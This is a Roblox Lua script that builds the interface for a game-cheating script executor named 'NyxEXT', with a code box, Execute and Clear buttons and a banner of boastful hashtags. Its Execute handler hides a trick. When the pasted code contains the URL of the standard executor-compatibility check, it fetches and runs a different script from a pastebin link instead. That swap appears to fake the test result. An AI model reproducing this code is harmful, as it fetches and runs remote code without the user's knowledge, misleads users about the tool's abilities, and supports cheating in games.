-- Gui to Lua
-- Version: 3.2

-- Instances:

local function uncfind(text, searchunc)
    return string.find(text, searchunc, 1, true) ~= nil
end

local NyxEXT = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Frame_2 = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")
local TextButton_5 = Instance.new("TextButton")
local ImageLabel_2 = Instance.new("ImageLabel")

--Properties:

NyxEXT.Name = "NyxEXT"
NyxEXT.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
NyxEXT.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = NyxEXT
Frame.BackgroundColor3 = Color3.fromRGB(84, 84, 84)
Frame.BorderColor3 = Color3.fromRGB(158, 158, 158)
Frame.Position = UDim2.new(0.336964428, 0, 0.235732004, 0)
Frame.Size = UDim2.new(0, 518, 0, 280)
Frame.Visible = false

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(84, 84, 84)
Frame_2.BorderColor3 = Color3.fromRGB(158, 158, 158)
Frame_2.Position = UDim2.new(0, 0, -0.00355377188, 0)
Frame_2.Size = UDim2.new(0, 518, 0, 48)

ImageLabel.Parent = Frame_2
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.0135135138, 0, 0.00892957021, 0)
ImageLabel.Size = UDim2.new(0, 38, 0, 51)
ImageLabel.Image = "rbxassetid://17510205446"
ImageLabel.ScaleType = Enum.ScaleType.Crop

TextLabel.Parent = Frame_2
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0868725851, 0, 0.541666687, 0)
TextLabel.Size = UDim2.new(0, 65, 0, 14)
TextLabel.Font = Enum.Font.Unknown
TextLabel.Text = "early access"
TextLabel.TextColor3 = Color3.fromRGB(218, 218, 218)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(84, 84, 84)
TextBox.BorderColor3 = Color3.fromRGB(158, 158, 158)
TextBox.Position = UDim2.new(0.0135133956, 0, 0.180119976, 0)
TextBox.Size = UDim2.new(0, 506, 0, 195)
TextBox.Font = Enum.Font.Code
TextBox.LineHeight = 3.000
TextBox.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
TextBox.PlaceholderText = "-- lua source"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextSize = 18.000
TextBox.TextWrapped = true
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(84, 84, 84)
TextButton.BorderColor3 = Color3.fromRGB(158, 158, 158)
TextButton.Position = UDim2.new(0.0135135138, 0, 0.899999976, 0)
TextButton.Size = UDim2.new(0, 67, 0, 22)
TextButton.Font = Enum.Font.SourceSansLight
TextButton.Text = "Execute"
TextButton.TextColor3 = Color3.fromRGB(218, 218, 218)
TextButton.TextSize = 15.000
TextButton.TextWrapped = true
TextButton.MouseButton1Down:connect(function()
    local unc = "https://raw.githubusercontent.com/unified-naming-convention/NamingStandard/main/UNCCheckEnv.lua"
    if uncfind(TextBox.Text, unc) then
        loadstring(game:HttpGet("https://pastebin.com/raw/qGXRcXpP"))()
    else
        loadstring(TextBox.Text)()
    end
end)

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(84, 84, 84)
TextButton_2.BorderColor3 = Color3.fromRGB(158, 158, 158)
TextButton_2.Position = UDim2.new(0.85907346, 0, 0.899999976, 0)
TextButton_2.Size = UDim2.new(0, 67, 0, 22)
TextButton_2.Font = Enum.Font.SourceSansLight
TextButton_2.Text = "Clear"
TextButton_2.TextColor3 = Color3.fromRGB(218, 218, 218)
TextButton_2.TextSize = 15.000
TextButton_2.TextWrapped = true
TextButton_2.MouseButton1Click:Connect(function()
	TextBox.Text = ""
end)

TextButton_3.Parent = NyxEXT
TextButton_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.BackgroundTransparency = 1.000
TextButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.BorderSizePixel = 0
TextButton_3.Position = UDim2.new(0.344441473, 0, 0.018137835, 0)
TextButton_3.Size = UDim2.new(0, 595, 0, 29)
TextButton_3.Font = Enum.Font.SourceSansLight
TextButton_3.Text = "#nyxontop #celeryontop #waveistrash #krampusexitscam #nyxwinning"
TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 14.000
TextButton_3.TextWrapped = true

TextButton_4.Parent = NyxEXT
TextButton_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.BackgroundTransparency = 1.000
TextButton_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.BorderSizePixel = 0
TextButton_4.Position = UDim2.new(0.0162705183, 0, 0.475122571, 0)
TextButton_4.Size = UDim2.new(0, 152, 0, 20)
TextButton_4.Font = Enum.Font.SourceSansLight
TextButton_4.Text = "open luau executor"
TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.TextScaled = true
TextButton_4.TextSize = 14.000
TextButton_4.TextWrapped = true
TextButton_4.MouseButton1Click:Connect(function()
	if (Frame.Visible == false) then
		Frame.Visible = true
	else
		Frame.Visible = false

	end

end)

ImageLabel_2.Parent = NyxEXT
ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_2.BackgroundTransparency = 1.000
ImageLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel_2.BorderSizePixel = 0
ImageLabel_2.Position = UDim2.new(0.48473081, 0, 0.0500349514, 0)
ImageLabel_2.Size = UDim2.new(0, 58, 0, 53)
ImageLabel_2.Image = "rbxassetid://17510205446"